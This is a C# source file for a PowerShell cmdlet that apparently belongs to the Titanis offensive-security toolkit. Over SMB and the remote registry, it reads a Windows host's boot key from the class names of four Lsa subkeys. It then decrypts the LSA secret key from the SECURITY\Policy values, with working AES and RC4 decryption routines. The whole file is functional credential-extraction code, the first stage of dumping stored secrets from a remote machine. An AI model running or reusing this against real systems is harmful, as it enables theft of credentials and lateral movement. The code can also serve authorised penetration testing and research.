using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;
using Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegLsaKeyInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? BootKey { get; init; }
		public byte[]? BootKeyBytes { get; init; }
		public string? LsaKey { get; init; }
		public byte[]? LsaKeyBytes { get; init; }
		public string? LsaKeySource { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegLsaKeys")]
	[OutputType(typeof(TboRegLsaKeyInfo))]
	public sealed class GetTBORegLsaKeys : TboRegCmdlet
	{
		private const string LsaKeyPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
		private const string PolicyPath = @"SECURITY\Policy";
		private const ulong BootKeyByteSwap = 0xEC6B4D50F91273A8;
		private static readonly string[] BootKeySubkeys = { "JD", "Skew1", "GBG", "Data" };

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			ExecuteRegistryOperation(smb, cancellationToken, session =>
			{
				byte[]? bootKey = null;
				byte[]? lsaKey = null;
				string? lsaKeySource = null;

				try
				{
					bootKey = ExtractBootKey(session.Client, cancellationToken);
				}
				catch (Exception ex)
				{
					smb.LogException($"Get-TBORegLsaKeys failed to derive the boot key from {this.ServerName}", ex);
					this.WriteWarning($"Get-TBORegLsaKeys failed to derive the boot key: {ex.Message}");
				}

				if (bootKey != null)
				{
					try
					{
						lsaKey = ExtractLsaKey(smb, session.Client, bootKey, cancellationToken, out lsaKeySource);
					}
					catch (Exception ex)
					{
						smb.LogException($"Get-TBORegLsaKeys failed to derive the LSA key from {this.ServerName}", ex);
						this.WriteWarning($"Get-TBORegLsaKeys failed to derive the LSA key: {ex.Message}");
					}
				}

				this.WriteObject(new TboRegLsaKeyInfo
				{
					ServerName = this.ServerName,
					BootKeyBytes = bootKey,
					BootKey = bootKey != null ? bootKey.ToHexString() : null,
					LsaKeyBytes = lsaKey,
					LsaKey = lsaKey != null ? lsaKey.ToHexString() : null,
					LsaKeySource = lsaKeySource
				});
			});
		}

		private byte[] ExtractBootKey(RemoteRegistryClient client, CancellationToken cancellationToken)
		{
			var lsaSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				LsaKeyPath);

			using var lsaKey = OpenRegistryKey(client, lsaSpec, RegistryAccessRights.QueryValue, cancellationToken);

			byte[] bootKey = new byte[16];
			ulong swapKey = BootKeyByteSwap;
			foreach (var subkeyName in BootKeySubkeys)
			{
				var subkeySpec = new RegistryPathSpec(
					lsaSpec.RootKey,
					lsaSpec.RootName,
					CombineSubkeyPath(lsaSpec.SubkeyPath, subkeyName));

				using var subkey = OpenRegistryKey(client, subkeySpec, RegistryAccessRights.QueryValue, cancellationToken);
				var info = subkey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
				var className = info.ClassName?.TrimEnd('\0');
				if (string.IsNullOrWhiteSpace(className))
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} is empty.");

				var bytes = BinaryHelper.ParseHexString(className.AsSpan());
				if (bytes.Length < 4)
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} does not contain 4 bytes.");

				for (int i = 0; i < 4; i++)
				{
					bootKey[(int)(swapKey & 0x0F)] = bytes[i];
					swapKey >>= 4;
				}
			}

			return bootKey;
		}

		private byte[]? ExtractLsaKey(
			ISmbProviderInfo smb,
			RemoteRegistryClient client,
			byte[] bootKey,
			CancellationToken cancellationToken,
			out string? lsaKeySource)
		{
			lsaKeySource = null;
			byte[]? polEkList = null;
			byte[]? legacy = null;
			try
			{
				polEkList = TryReadPolicySecretValue(client, "PolEKList", cancellationToken);
				legacy = TryReadPolicySecretValue(client, "PolSecretEncryptionKey", cancellationToken);
			}
			catch (NtstatusException ex) when (ex.StatusCode == Ntstatus.STATUS_PIPE_BUSY)
			{
				polEkList = ExecuteRegistryOperationWithResult(smb, cancellationToken, session =>
				{
					return TryReadPolicySecretValue(session.Client, "PolEKList", cancellationToken);
				});

				legacy = ExecuteRegistryOperationWithResult(smb, cancellationToken, session =>
				{
					return TryReadPolicySecretValue(session.Client, "PolSecretEncryptionKey", cancellationToken);
				});
			}

			if (polEkList != null && polEkList.Length > 0)
			{
				var decrypted = DecryptLsaData(polEkList, bootKey);
				if (decrypted.Length >= 100)
				{
					lsaKeySource = "Policy\\PolEKList";
					return decrypted.AsSpan(68, 32).ToArray();
				}
			}

			if (legacy != null && legacy.Length >= 76)
			{
				var lsaKey = DecryptLegacyLsaKey(legacy, bootKey);
				if (lsaKey != null)
				{
					lsaKeySource = "Policy\\PolSecretEncryptionKey";
					return lsaKey;
				}
			}

			return null;
		}

		private byte[]? TryReadPolicySecretValue(RemoteRegistryClient client, string name, CancellationToken cancellationToken)
		{
			var keyPath = CombineSubkeyPath(PolicyPath, name);
			var spec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				keyPath);

			try
			{
				using var key = OpenRegistryKey(client, spec, RegistryAccessRights.QueryValue, cancellationToken);
				var valueInfo = key.GetValue(null, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
				return null;
			}
		}

		private T ExecuteRegistryOperationWithResult<T>(
			ISmbProviderInfo smb,
			CancellationToken cancellationToken,
			Func<RemoteRegistrySession, T> func)
		{
			return RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, func);
		}

		private static byte[]? TryReadValueBytes(RegistryKey key, string name, CancellationToken cancellationToken)
		{
			try
			{
				var valueInfo = key.GetValue(name, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
			}

			return null;
		}

		private static byte[]? ExtractValueBytes(RegistryValueInfo info)
		{
			if (info.Bytes != null && info.Bytes.Length > 0)
				return info.Bytes;
			if (info.TypedValue is byte[] typedBytes && typedBytes.Length > 0)
				return typedBytes;
			return null;
		}

		private static bool IsMissingKey(Win32Exception ex)
		{
			return ex.NativeErrorCode is (int)Win32ErrorCode.ERROR_FILE_NOT_FOUND
				or (int)Win32ErrorCode.ERROR_PATH_NOT_FOUND
				or (int)Win32ErrorCode.ERROR_BAD_PATHNAME;
		}

		private static byte[] DecryptLsaData(byte[] policySecret, byte[] key)
		{
			if (policySecret.Length < 60)
				return Array.Empty<byte>();

			byte[] shaKey;
			using (var sha256 = SHA256.Create())
			{
				sha256.TransformBlock(key, 0, key.Length, null, 0);
				for (int i = 0; i < 1000; i++)
				{
					sha256.TransformBlock(policySecret, 28, 32, null, 0);
				}
				sha256.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
				shaKey = sha256.Hash ?? Array.Empty<byte>();
			}

			if (shaKey.Length == 0)
				return Array.Empty<byte>();

			using var aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.None;
			aes.Key = shaKey;
			var iv = new byte[16];

			var output = new byte[(policySecret.Length - 60) / 16 * 16];
			int outputOffset = 0;
			for (int offset = 60; offset + 16 <= policySecret.Length; offset += 16)
			{
				using var decryptor = aes.CreateDecryptor(aes.Key, iv);
				var block = decryptor.TransformFinalBlock(policySecret, offset, 16);
				Buffer.BlockCopy(block, 0, output, outputOffset, block.Length);
				outputOffset += block.Length;
			}

			if (outputOffset != output.Length)
				Array.Resize(ref output, outputOffset);

			return output;
		}

		private static byte[]? DecryptLegacyLsaKey(byte[] policySecret, byte[] bootKey)
		{
			if (policySecret.Length < 76)
				return null;

			byte[] md5Key;
			using (var md5 = MD5.Create())
			{
				md5.TransformBlock(bootKey, 0, bootKey.Length, null, 0);
				for (int i = 0; i < 1000; i++)
					md5.TransformBlock(policySecret, 60, 16, null, 0);
				md5.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
				md5Key = md5.Hash ?? Array.Empty<byte>();
			}

			if (md5Key.Length == 0)
				return null;

			var encrypted = policySecret.AsSpan(12, 48).ToArray();
			var decrypted = Rc4Transform(md5Key, encrypted);
			if (decrypted.Length < 32)
				return null;

			return decrypted.AsSpan(16, 16).ToArray();
		}

		private static byte[] Rc4Transform(byte[] key, byte[] data)
		{
			byte[] s = new byte[256];
			for (int i = 0; i < s.Length; i++)
				s[i] = (byte)i;

			int j = 0;
			for (int i = 0; i < s.Length; i++)
			{
				j = (j + s[i] + key[i % key.Length]) & 0xFF;
				(s[i], s[j]) = (s[j], s[i]);
			}

			byte[] output = new byte[data.Length];
			int iIndex = 0;
			j = 0;
			for (int k = 0; k < data.Length; k++)
			{
				iIndex = (iIndex + 1) & 0xFF;
				j = (j + s[iIndex]) & 0xFF;
				(s[iIndex], s[j]) = (s[j], s[iIndex]);
				var keyByte = s[(s[iIndex] + s[j]) & 0xFF];
				output[k] = (byte)(data[k] ^ keyByte);
			}

			return output;
		}

		private static string? CombineSubkeyPath(string? basePath, string childName)
		{
			if (string.IsNullOrEmpty(basePath))
				return childName;
			if (string.IsNullOrEmpty(childName))
				return basePath;
			return $"{basePath}\\{childName}";
		}
	}
}
